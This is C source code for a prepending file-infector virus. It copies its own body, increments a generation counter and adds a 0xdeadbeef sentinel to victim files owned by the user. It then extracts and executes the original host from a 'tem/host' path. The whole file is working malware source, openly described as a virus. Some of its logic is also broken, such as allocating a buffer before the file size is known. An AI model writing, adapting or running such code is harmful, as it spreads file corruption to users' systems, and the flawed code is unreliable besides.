#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static const unsigned char SENTINEL[] = {0xde, 0xad, 0xbe, 0xef};

// Read a complete file into memory
static unsigned char *read_file(const char *name, size_t *size) {
    int fd = open(name, O_RDONLY);
    unsigned char *data = malloc(*size);
    
    // Get the size of the file descriptor
    struct stat status;
    fstat(fd, &status);
    *size = (size_t)status.st_size;

    read(fd, data, *size);
    close(fd);

    return data;
}

// Find 0xdeadbeef in an infected binary
static size_t find_sentinel(const unsigned char *data, size_t size) {
    for (size_t i = 0; i + sizeof(SENTINEL) <= size; i++) {
        if (memcmp(data + i, SENTINEL, sizeof(SENTINEL)) == 0) {
            return i;
        }
    }

    return size;
}

// Write the infected file to disk
static void write_file(const char *name, const unsigned char *data, size_t size, mode_t mode) {
    int fd = open(name, O_WRONLY | O_CREAT | O_TRUNC, mode);
    write(fd, data, size);
    close(fd);
}

// Infect by incrementing the counter and prepend virus + sentinel to the original victim.
static void infect(const char *self_name, const char *victim_name) {
    struct stat victim_status;

    // Check if the victim exists and is writable by the current user
    if (stat(victim_name, &victim_status) < 0) {
        return;
    }

    // Check if the victim is owned by the current user, is not executable, and is writable
    if (victim_status.st_uid != getuid() ||
        (victim_status.st_mode & 0111) != 0 ||
        access(victim_name, W_OK) != 0) {
        return;
    }

    size_t victim_size;
    unsigned char *victim = read_file(victim_name, &victim_size);

    // Check if the victim is already infected by looking for the sentinel
    if (find_sentinel(victim, victim_size) != victim_size) {
        free(victim);
        return;
    }

    size_t self_size;
    unsigned char *self = read_file(self_name, &self_size);

    size_t sentinel_offset = find_sentinel(self, self_size);

    size_t infected_size = sentinel_offset + sizeof(SENTINEL) + victim_size;
    unsigned char *infected = malloc(infected_size);

    // Copy only the virus portion from the beginning of self to the victim
    memcpy(infected, self, sentinel_offset);

    // Increment the four-byte counter located before the sentinel
    unsigned char *counter = infected + sentinel_offset - 4;
    uint32_t value = 0;

    for (size_t i = 0; i < 4; i++) {
        value |= (uint32_t)counter[i] << (i * 8);
    }

    value++;

    for (size_t i = 0; i < 4; i++) {
        counter[i] = (unsigned char)(value >> (i * 8));
    }

    // Add the sentinel and then the original victim. 
    memcpy(infected + sentinel_offset, SENTINEL, sizeof(SENTINEL));
    memcpy(infected + sentinel_offset + sizeof(SENTINEL), victim, victim_size);

    write_file(victim_name, infected, infected_size, victim_status.st_mode & 0777);

    free(infected);
    free(victim);
    free(self);
}

int main(int argc, char *argv[]) {
    // Read the file named by argv[0]
    size_t self_size;
    unsigned char *self = read_file(argv[0], &self_size);

    // Locate 0xdeadbeef inside argv[0].
    size_t sentinel_offset = find_sentinel(self, self_size);

    // Copy everything after 0xdeadbeef into tem/host
    mkdir("tem", 0755);

    size_t host_size = self_size - sentinel_offset - sizeof(SENTINEL);
    unsigned char *host_start = self + sentinel_offset + sizeof(SENTINEL);

    write_file("tem/host", host_start, host_size, 0755);

    // Infect argv[1] before running the extracted host
    if (argc >= 2) {
        infect(argv[0], argv[1]);
    }

    // Run the extracted file at tem/host
    char *host_arguments[] = {"tem/host", NULL, NULL};

    if (argc >= 2) {
        host_arguments[1] = argv[1];
    }

    execv("tem/host", host_arguments);

    free(self);
    return 1;
}